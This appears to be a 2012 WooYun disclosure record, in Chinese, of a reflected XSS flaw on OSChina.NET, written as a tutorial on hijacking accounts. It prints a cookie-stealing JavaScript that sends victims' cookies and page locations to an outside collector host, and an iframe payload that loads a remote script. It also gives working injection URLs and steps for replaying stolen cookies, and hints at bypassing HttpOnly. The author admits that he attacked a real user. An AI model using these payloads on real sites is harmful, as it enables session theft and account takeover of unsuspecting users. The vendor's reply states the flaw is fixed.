{"id": 17070, "wybug_id": "wooyun-2012-013241", "wybug_title": "使用反射型xss劫持OSChina.NET用户账号", "wybug_corp": "开源中国", "wybug_author": "蟋蟀哥哥", "wybug_date": "2012-10-11 12:01", "wybug_open_date": "2012-10-11 12:01", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-10-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可以劫持管理员的。已经通知osc修复了的。。所以自评10rank。。此文的目的是科普一些xss的简单用法。我这里只是给大家演示xss利用方式非常灵活。不可小视,特别是对osc这种社区形式的网站危害是最大的。原文地址:http://my.oschina.net/samshuai/blog/82382@红薯 想拿一个wooyun的厂家账号。并且欢迎大家来osc进行安全测试。完全欢迎。。并且有礼物相送。。 详细说明：  首先,先道歉..让@铂金小猪 成为了受害用户...当了我儿子一天...现在@Soga @皮总 你们知道那天是怎么回事了吧。。其实今天要讲的是Xss(Cross Site Scripting)的一种利用方式:劫持用户账号首先需要找到OSChina存在xss注入的地方。：)这里先隐藏。。等@红薯 修复。。。然后再将带有XSS的url(我使用了google的短链接包装了一下)发给受害者@铂金小猪 。 \n\n然后让oschina充满养猪广告的妹纸@铂金小猪 哭了:\n\n\n\n不信的话，大家现在还可以去看@铂金小猪 空间左侧的签名 \n\n其实xss大家搜搜下就知道怎么利用了。。但是劫持账户上。大家可能觉得有两个难点..我在这里教大家。。1.如果收到被害者的cookie.其实可以在自己网站上做一个脚本来进行cookie收集。。。也可以用第三方的cookie收集平台。。比如xsser.me或者xss.la等。这两个平台都是禁止注册的。。自己写一个就好.很简单 熟悉javascript,简单看下别人偷cookie的代码。。就明白是怎么回事了\n01\tvar x=new Image();02\ttry03\t{04\tvar myopener='';05\tmyopener=window.opener && window.opener.location ? window.opener.location : '';06\t}07\tcatch(err)08\t{09\t}10\tx.src='http://xssapp.com/accept.aspx?id=@pid&location='+escape(document.location)+'&toplocation='+escape(top.document.location)+'&cookie='+escape(document.cookie)+'&opener='+escape(myopener);11\tself.location=\"http://my.oschina.net/samshuai\";\n上面是我的xss.la上的javascript代码。。。再发个别人的一个利用方式:\n<iframe onload=\"this.src='xss 地址+<script src =tmxk.Org/0.js>'\" style=\"display:none\"></iframe>\n2.获得cookie之后，如何使用?其实firefox和chrome都有插件可以完成这个功能。直接替换上@铂金小猪 的oscid就可以用他的账号说话了。。我用的是firefox的web developer toolbar: \n\n@红薯 兼职就是聪明绝顶啊。。。这两天他捣鼓了一个Java EE 6.0 的 Cookie 类已经有设置 HttpOnly 的方法(http://www.oschina.net/question/12_72706)。。其实使用httponly也是一种防止cookie被盗和被修改的方法。。主要让document.cookie不起作用。这真的能防止cookie被盗么？？？我笑了。。。。。大家可以说下继续利用的方式。。看看和我的绕过httponly方法是否一致。我的方法里面包裹document.xxx大家想想吧。。。还有就是使用了httponly真的不能使用工具修改自己的cookie了么？？也是有极其淫荡的方式的。。。大家也可以说说。扩展阅读:网络攻击技术(二)——Cross-site scripting：http://www.oschina.net/question/565065_57506Java EE 6.0 的 Cookie 类已经有设置 HttpOnly 的方法:http://www.oschina.net/question/12_72706什么是HttpOnly:http://www.oschina.net/question/100267_65116利用最近热门的Xss漏洞能做什么?:http://www.enet.com.cn/article/2007/0905/A20070905810709.shtml如何解决繁琐的WEB前端的XSS问题:http://my.oschina.net/u/254689/blog/53005对oschina的一次友情xss测试:http://www.ecartchina.com/xss-test-oschina-a-friendship.html   漏洞证明：  可以劫持管理员的。已经通知osc修复了的。。所以自评10rank。。原文地址:http://my.oschina.net/samshuai/blog/82382@红薯 想拿一个wooyun的厂家账号。并且欢迎大家来osc进行安全测试。完全欢迎。。并且有礼物相送。。xss注入地址:http://my.oschina.net/samshuai/admin/profile?form='\"--></script><script>alert(/xss by shuai/)</script>           http://my.oschina.net/samshuai/admin/profile?form=\"><script>alert(/xss by shuai/)</script>   修复方案：  已经修复了的.   版权声明：转载请注明来源 蟋蟀哥哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n          这些评论似乎很乌云~~~思密达          2012-10-11 12:09 |\t\t\t\t\t开源中国(乌云厂商)\t\t\t\t\t\t\t\n  此问题已经修复，谢谢提交：）    \n   \n \n     2012-10-11 12:09 |    \t\t开源中国(乌云厂商)\t\t \n  此问题已经修复，谢谢提交：）    \n     2012-10-11 13:37 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  大大们都在引到厂商入驻呀。。@红薯==@开源中国？    \n     2012-10-11 13:58 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @瘦蛟舞 是的。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}